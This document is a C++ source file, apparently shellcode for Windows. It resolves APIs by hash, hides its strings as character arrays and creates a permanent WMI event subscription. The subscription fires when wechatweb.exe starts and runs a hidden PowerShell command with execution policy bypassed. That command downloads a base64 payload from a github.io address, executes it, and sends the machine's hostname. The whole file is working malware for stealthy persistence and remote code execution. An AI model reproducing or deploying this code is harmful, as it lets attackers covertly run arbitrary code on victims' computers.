// sc.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <windows.h>
#include <wbemcli.h>
#include <comdef.h>
#include <Wbemidl.h>


#define HASH_LoadLibraryExA 0xC0D83287
//#define HASH_VirtualAlloc 0x1EDE5967
//#define HASH_URLDownloadToFileA 0x9AAFD680
//#define HASH_WinExec 0x1A22F51


#define HASH_VariantInit 0x42F4286
#define HASH_CoInitializeEx 0xDE5BC449
#define HASH_CoSetProxyBlanket 0x1EB6BC27
#define HASH_CoInitializeSecurity 0x57662EC7
#define HASH_CoCreateInstance 0xAC0F1E19
#define HASH_CoUninitialize 0xED8B4DB6

int GetFunAddrByHash(int nHashDigest, HMODULE hModule);

#define DefineFuncPtr(name,base) \
decltype(name) *My_##name = \
(decltype(name)*)GetFunAddrByHash(HASH_##name,base)

VOID MemZero(PBYTE lpBuff, int nSize)
{
    __asm PUSHAD;
	__asm MOV EDI, lpBuff;
	__asm XOR EAX, EAX;
	__asm MOV ECX, nSize;
	__asm CLD;
	__asm REP STOSB;
    __asm POPAD;
}

bool Hash_CmpString(char* strFunName, int nHash)
{
	unsigned int nDigest = 0;
	while (*strFunName)
	{
		nDigest = ((nDigest << 25) | (nDigest >> 7));// == ROR 7
		nDigest = nDigest + *strFunName;
		strFunName++;
	}
	return nHash == nDigest ? true : false;
}

HMODULE GetKernelBase()
{
    __asm
    {
        PUSH ESI;
        MOV ESI, DWORD PTR FS : [0x30] ; // PEB
        MOV ESI, [ESI + 0x0C];			// PEB_LDR_DATA
        MOV ESI, [ESI + 0x1C];			// 模块链表指针Initial..List
        MOV ESI, [ESI];					// 访问链表中的第2个条目
        MOV ESI, [ESI + 0x08];			// 获取模块地址（Kernel32.dll/KernelBase.dll）
        MOV EAX, ESI;
        POP ESI;
    }
}

int GetFuncAddrForwared(ULONG_PTR dwFunAddr,int nHashDigest, HMODULE hModule)
{
    char mod[50];
    MemZero((byte*)mod, 50);
    char* szFuncName = (CHAR*)dwFunAddr;
    ULONG_PTR offset = 0;
    do
    {
        mod[offset] = szFuncName[offset];
        offset++;
    } while (szFuncName[offset] != '.');


    // strcat
    CHAR ext[] = { '.','d','l','l','\0' };
    ULONG_PTR index = 0;
    do
    {
        mod[offset] = ext[index];
        offset++;
        index++;
    } while (ext[index] != '\0');

    HMODULE hKeyModule = GetKernelBase();
    DefineFuncPtr(LoadLibraryExA, hKeyModule);
    hKeyModule = My_LoadLibraryExA(mod, 0, 0);
    return GetFunAddrByHash(nHashDigest, hKeyModule);
}

int GetFunAddrByHash(int nHashDigest, HMODULE hModule)
{
	// 1.获取DOS头、NT头
	PIMAGE_DOS_HEADER pDos_Header;
	PIMAGE_NT_HEADERS pNt_Header;
	pDos_Header = (PIMAGE_DOS_HEADER)hModule;
	pNt_Header = (PIMAGE_NT_HEADERS)((ULONG_PTR)hModule + pDos_Header->e_lfanew);

	// 2.获取导出表项
	PIMAGE_DATA_DIRECTORY pDataDir = pNt_Header->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;
	PIMAGE_EXPORT_DIRECTORY pEport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModule + pDataDir->VirtualAddress);
	// 3.获取导出表详细信息
	PDWORD pAddrOfFun = (PDWORD)(pEport->AddressOfFunctions + (DWORD)hModule);
	PDWORD pAddrOfNames = (PDWORD)(pEport->AddressOfNames + (DWORD)hModule);
	PWORD pAddrOfOrdinals = (PWORD)(pEport->AddressOfNameOrdinals + (DWORD)hModule);
	// 4.处理以函数名查找函数地址的请求，循环获取ENT中的函数名（因为以
	// 函数名为基准，因此不考虑无函数名的情况）,并与传入名对比，如能匹配上
	// 则在EAT中以指定序号为索引，并找出其地址值
	DWORD dwFunAddr;
	for (DWORD i = 0; i < pEport->NumberOfNames; i++)
	{
		PCHAR lpFunName = (PCHAR)(pAddrOfNames[i] + (DWORD)hModule);
		if (Hash_CmpString(lpFunName, nHashDigest))
		{
			dwFunAddr = pAddrOfFun[pAddrOfOrdinals[i]] + (DWORD)hModule;

            // 如果是转发函数，重新获取函数地址
            if (dwFunAddr >= (ULONG_PTR)pEport && (ULONG_PTR)dwFunAddr < (ULONG_PTR)pEport + pDataDir->Size)
            {
                dwFunAddr = GetFuncAddrForwared(dwFunAddr, nHashDigest, hModule);
            }
			break;
		}
		if (i == pEport->NumberOfNames - 1)
		{
			return 0;
		}
	}
	return dwFunAddr;
}

BOOL putStringInClass(IWbemClassObject* obj, BSTR key, BSTR val, tag_CIMTYPE_ENUMERATION type) {
	VARIANT v;
	HRESULT hr;
    HMODULE hKeyModule = GetKernelBase();
    DefineFuncPtr(LoadLibraryExA, hKeyModule);
    CHAR szOleAut32[] = { 'O','l','e','A','u','t','3','2','.','d','l','l','\0' };
    HMODULE hOleAut32 = My_LoadLibraryExA(szOleAut32, 0, 0);
    DefineFuncPtr(VariantInit, hOleAut32);
	My_VariantInit(&v);
	v.vt = VT_BSTR;
	v.bstrVal = val;
	hr = obj->Put(key, 0, &v, type);
	if (FAILED(hr))
		return FALSE;
	return TRUE;
}



VOID entry()
{
	HRESULT hres;
	IWbemLocator* pLoc = NULL;
	IWbemServices* pSvc = NULL;
	IEnumWbemClassObject* enumerator = NULL;
	IWbemClassObject* ef = NULL, * ec = NULL, * e2c = NULL, * ti = NULL;
	IWbemClassObject* eventConsumer = NULL, * eventFilter = NULL, * f2cBinding = NULL, * timerinstruction = NULL;

	// 1.局部字符串
    CHAR szOle32[] = { 'O','l','e','3','2','.','d','l','l', '\0' };

	// 2.获取关键模块基址
	HMODULE hKeyModule = GetKernelBase();
	
	// 3.获取关键函数地址
	DefineFuncPtr(LoadLibraryExA, hKeyModule);

	//HMODULE hKernel32 = My_LoadLibraryExA(szKernel32, 0, 0);
    HMODULE hOle32 = My_LoadLibraryExA(szOle32, 0, 0);


    DefineFuncPtr(CoInitializeEx, hOle32);

	

    do
    {
        hres = My_CoInitializeEx(0, 0);
        if (FAILED(hres))
        {
            break;
        }

        //init COM security context
        DefineFuncPtr(CoInitializeSecurity, hOle32);
        hres = My_CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hres)) {
            break;
        }

        CLSID CLSID_WbemLocator = { 0x4590F811, 0x1D3A, 0x11D0, {0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24} };
        IID IID_IWbemLocator    =  { 0xdc12a687, 0x737f, 0x11cf,{0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24} };



        DefineFuncPtr(CoCreateInstance, hOle32);
        hres = My_CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (FAILED(hres))
        {
            break;
        }

        WCHAR NameSpec[] = { 'R','O','O','T','\\','S','U','B','S','C','R','I','P','T','I','O','N','\0'};
        hres = pLoc->ConnectServer(NameSpec, NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres))
        {
            break;
        }
        DefineFuncPtr(CoSetProxyBlanket, hOle32);
        hres = My_CoSetProxyBlanket(
            pSvc,                         // the proxy to set
            RPC_C_AUTHN_WINNT,            // authentication service
            RPC_C_AUTHZ_NONE,             // authorization service
            NULL,                         // Server principal name
            RPC_C_AUTHN_LEVEL_CALL,       // authentication level
            RPC_C_IMP_LEVEL_IMPERSONATE,  // impersonation level
            NULL,                         // client identity 
            EOAC_NONE                     // proxy capabilities     
        );
        if (FAILED(hres))
        {
            break;
        }

        //get class instances
        WCHAR CommandLineEventConsumer[] = { 'C','o','m','m','a','n','d','L','i','n','e','E','v','e','n','t','C','o','n','s','u','m','e','r', '\0' };
        hres = pSvc->GetObject(CommandLineEventConsumer, 0, NULL, &eventConsumer, NULL);
        if (FAILED(hres))
        {
            break;
        }
        WCHAR EventFilter[] = { '_','_','E','v','e','n','t','F','i','l','t','e','r', '\0' };
        hres = pSvc->GetObject(EventFilter, 0, NULL, &eventFilter, NULL);
        if (FAILED(hres))
        {
            break;
        }
        WCHAR EventConsumer[] = { '_','_','F','i','l','t','e','r','T','o','C','o','n','s','u','m','e','r','B','i','n','d','i','n','g', '\0' };
        hres = pSvc->GetObject(EventConsumer, 0, NULL, &f2cBinding, NULL);
        if (FAILED(hres))
        {
            break;
        }

        //spawn __EventFilter class instance
        hres = eventFilter->SpawnInstance(0, &ef);
        if (FAILED(hres))
        {
            break;
        }
        WCHAR EventNameSpace[] = { 'E','v','e','n','t','N','a','m','e','S','p','a','c','e', '\0'};
        WCHAR EventNameSpaceValue[] = { 'r','o','o','t','\\','c','i','m','v','2','\0' };

        WCHAR Query[] = { 'Q','u','e','r','y', '\0'};
        WCHAR QueryValue[] = { 's','e','l','e','c','t',' ','*',' ','f','r','o','m',' ','_','_','I','n','s','t','a','n','c','e','C','r','e','a','t','i','o','n','E','v','e','n','t',' ','w','i','t','h','i','n',' ','5',' ','w','h','e','r','e',' ','t','a','r','g','e','t','i','n','s','t','a','n','c','e',' ','i','s','a',' ','"','w','i','n','3','2','_','p','r','o','c','e','s','s','"',' ','a','n','d',' ','t','a','r','g','e','t','i','n','s','t','a','n','c','e','.','n','a','m','e','=','"','w','e','c','h','a','t','w','e','b','.','e','x','e','"','\0' };

        WCHAR QueryLanguage[] = { 'Q','u','e','r','y','L','a','n','g','u','a','g','e', '\0'};
        WCHAR QueryLanguageValue[] = { 'W','Q','L', '\0' };

        WCHAR Name[] = { 'N','a','m','e', '\0'};
        WCHAR NameValue[] = { 'F','i','l','t','e','r','\0' };

        putStringInClass(ef, EventNameSpace, EventNameSpaceValue, CIM_STRING);
        putStringInClass(ef, Query, QueryValue, CIM_STRING);
        putStringInClass(ef, QueryLanguage, QueryLanguageValue, CIM_STRING);
        putStringInClass(ef, Name, NameValue, CIM_STRING);
        hres = pSvc->PutInstance(ef, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        if (FAILED(hres)) {
            break;
        }

        //spawn CommandLineEventConsumer class instance
        hres = eventConsumer->SpawnInstance(0, &ec);
        if (FAILED(hres)) {
            break;
        }

        WCHAR CuonsumerNameValue[] = { '_','_','S','y','s','C','o','n','s','u','m','e','r','1','\0' };
        WCHAR CommandLineTemplate[] = { 'C','o','m','m','a','n','d','L','i','n','e','T','e','m','p','l','a','t','e','\0' };
        WCHAR cmd[] = { 'p','o','w','e','r','s','h','e','l','l',' ','-','w',' ','h','i','d','d','e','n',' ','-','e','p',' ','b','y','p','a','s','s',' ','-','n','o','p',' ','-','c',' ','"','$','i','=','(','N','e','w','-','O','b','j','e','c','t',' ','S','y','s','t','e','m','.','N','e','t','.','W','e','b','C','l','i','e','n','t',')',';','$','i','.','H','e','a','d','e','r','s','.','a','d','d','(','\'','h','o','s','t','i','d','\'',',','[','n','e','t','.','d','n','s',']',':',':','G','e','t','H','o','s','t','B','y','N','a','m','e','(','\'','\'',')','.','H','o','s','t','N','a','m','e',')',';','I','E','X','(','[','T','e','x','t','.','E','n','c','o','d','i','n','g',']',':',':','A','s','c','i','i','.','G','e','t','S','t','r','i','n','g','(','[','C','o','n','v','e','r','t',']',':',':','F','r','o','m','B','a','s','e','6','4','S','t','r','i','n','g','(','(','$','i','.','D','o','w','n','l','o','a','d','S','t','r','i','n','g','(','\'','h','t','t','p',':','/','/','c','s','s','x','n','.','g','i','t','h','u','b','.','i','o','/','t','e','s','t','.','t','x','t','\'',')',')',')',')',')','"','\0' };
        putStringInClass(ec, Name, CuonsumerNameValue, CIM_STRING);
        putStringInClass(ec, CommandLineTemplate, cmd, CIM_STRING);
        hres = pSvc->PutInstance(ec, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        if (FAILED(hres))
        {
            break;
        }

        // spawn __FilterToConsumerBinding class instance
        hres = f2cBinding->SpawnInstance(0, &e2c);
        if (FAILED(hres))
        {
            break;
        }
        WCHAR CuonsumerBindName[] = { 'C','o','n','s','u','m','e','r','\0' };

        WCHAR* CuonsumerBindNameValue = NULL;

        __asm call getPC;
    getPC:
        __asm pop CuonsumerBindNameValue;

        // 这里生成shellcode以后，手动替换字符串偏移
        CuonsumerBindNameValue = (WCHAR*)((CHAR*)CuonsumerBindNameValue+0x100);

        WCHAR FilterName[] = { 'F','i','l','t','e','r','\0' };
        WCHAR FilterValue[] = { '_','_','E','v','e','n','t','F','i','l','t','e','r','.','N','a','m','e','=','"','F','i','l','t','e','r','"','\0' };
        putStringInClass(e2c, CuonsumerBindName, CuonsumerBindNameValue, CIM_REFERENCE);
        putStringInClass(e2c, FilterName, FilterValue, CIM_REFERENCE);
        hres = pSvc->PutInstance(e2c, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        if (FAILED(hres))
        {
            break;
        }

    } while (false);



    // Cleanup
    // ========
    if (f2cBinding)
    {
        f2cBinding->Release();
    }
    if (eventFilter)
    {
        eventFilter->Release();
    }
    if (eventConsumer)
    {
        eventConsumer->Release();
    }
    if (pSvc)
    {
        pSvc->Release();
    }
    if (pLoc)
    {
        pLoc->Release();
    }
    DefineFuncPtr(CoUninitialize, hOle32);
    My_CoUninitialize();

}


int main()
{
	entry();
	return 0;
}
